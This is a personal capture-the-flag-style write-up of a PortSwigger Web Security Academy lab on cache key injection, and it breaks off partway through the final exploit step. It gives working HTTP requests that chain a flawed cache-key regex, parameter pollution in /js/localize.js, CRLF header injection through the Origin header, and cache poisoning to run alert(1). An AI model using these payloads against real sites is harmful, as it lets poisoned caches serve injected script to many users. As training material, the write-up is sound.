
# #PortSwigger 


![[Pasted image 20260615111845.png]]


## Lab Description (from PortSwigger)

> This lab contains multiple independent vulnerabilities, including cache key injection. A user regularly visits this site's home page using Chrome.
> 
> **Objective:** Combine the vulnerabilities to execute `alert(1)` in the victim's browser. You will need to make use of the `Pragma: x-get-cache-key` header to solve this lab.

---
---

## Step 1: Understanding the Vulnerability Chain

**This lab requires combining four vulnerabilities:**
1. **Flawed regex in cache key** - `utm_content` parameter is excluded using a flawed regex, allowing appending unkeyed content to the `lang` parameter
2. **Client-side parameter pollution** - `/js/localize.js` doesn't URL-encode the `lang` parameter value
3. **Response header injection** - `/js/localize.js` allows injecting headers via the `Origin` header when `cors=1`
4. **Cache key injection** - The header injection can be triggered via a crafted URL (cache key injection)

---

## Step 2: Reconnaissance

### Step 2.1: Identify the Cache Key Vulnerability

Use the `Pragma: x-get-cache-key` header to see what the server uses as cache key:
```
GET / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Pragma: x-get-cache-key
```

![[Pasted image 20260615173243.png]]

![[Pasted image 20260615173257.png]]
**Response:** Shows the cache key components.

### Step 2.2: Analyze the Login Redirect

Observe that `/login` redirects with a `lang` parameter:
```
GET /login?lang=en HTTP/2
```

![[Pasted image 20260615173324.png]]

**Response:** `302 Found` redirecting to `/login/?lang=en`

The regex excludes `utm_content` from the cache key:
```
/login?lang=en?utm_content=anything
```

![[Pasted image 20260615173550.png]]
The `utm_content` parameter is ignored for caching but still processed by the application.

---

## Step 3: Client-Side Parameter Pollution

### Step 3.1: Analyze /js/localize.js

The script at `/js/localize.js` is vulnerable to parameter pollution via the `lang` parameter:
```
GET /js/localize.js?lang=en HTTP/2
```

![[Pasted image 20260615173649.png]]

The script doesn't URL-encode the `lang` value, allowing injection of additional parameters.

### Step 3.2: Test Parameter Pollution

Append additional parameters:
```
GET /js/localize.js?lang=en?cors=1&x=1 HTTP/2
```

**Request:**
![[Pasted image 20260615173838.png]]

**Response:**
![[Pasted image 20260615173912.png]]

The `cors=1` parameter enables CORS mode, which makes the endpoint reflect the `Origin` header.

---

## Step 4: Vulnerability 3 — Response Header Injection

### Step 4.1: Test Origin Header Injection

The `/js/localize.js` endpoint supports `cors=1` parameter, which makes it reflect the `Origin` header in the response.

**Test request:**
```
GET /js/localize.js?lang=en&cors=1&x=1 HTTP/2
Origin: https://evil.com
```

![[Pasted image 20260615174802.png]]

**Response may include:**
```
Access-Control-Allow-Origin: https://evil.com
```

![[Pasted image 20260615174850.png]]

### Step 4.2: Inject via CRLF

We can inject a **carriage return + line feed** (`%0d%0a`) in the `Origin` header to add arbitrary HTTP headers:
```
Origin: x%0d%0aContent-Length: 8%0d%0a%0d%0aalert(1)
```

![[Pasted image 20260615174948.png]]

When decoded, this becomes:
```
Origin: x
Content-Length: 8

alert(1)
```

![[Pasted image 20260615175135.png]]

This injects a `Content-Length` header and a response body containing `alert(1)`.

**Note from hint:** The injected origin header must be **lowercase** to comply with HTTP/2 specification.

---

## Step 5: Vulnerability 4 - Cache Key Injection

### Step 5.1: Use Pragma: x-get-cache-key

The `Pragma: x-get-cache-key` header reveals how the cache key is constructed:
```
Pragma: x-get-cache-key
```

![[Pasted image 20260615175229.png]]

![[Pasted image 20260615175246.png]]
**Response:** Returns the cache key for the request.

This helps identify what parameters affect the cache key.

### Step 5.2: Poison the Cache

By crafting a request that:
1. Bypasses cache key restrictions (using `utm_content`)
2. Injects headers via CRLF
3. Contains malicious payload

We can poison the cache for `/login?lang=en`.

---

## Step 6: Crafting the Exploit

### Step 6.1: Request 1 — Poison /js/localize.js

```
GET /js/localize.js?lang=en?utm_content=z&cors=1&x=1 HTTP/2
Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$
```

![[Pasted image 20260615175808.png]]

**What this does:**
- `lang=en?utm_content=z` -> Bypasses cache key
- `cors=1` -> Enables CORS header injection
- `Origin` header contains CRLF injection -> Adds `Content-Length: 8` and `alert(1)` to response body

### Step 6.2: Request 2 - Poison /login

```
GET /login?lang=en?utm_content=x%26cors=1%26x=1$$origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23 HTTP/2
```

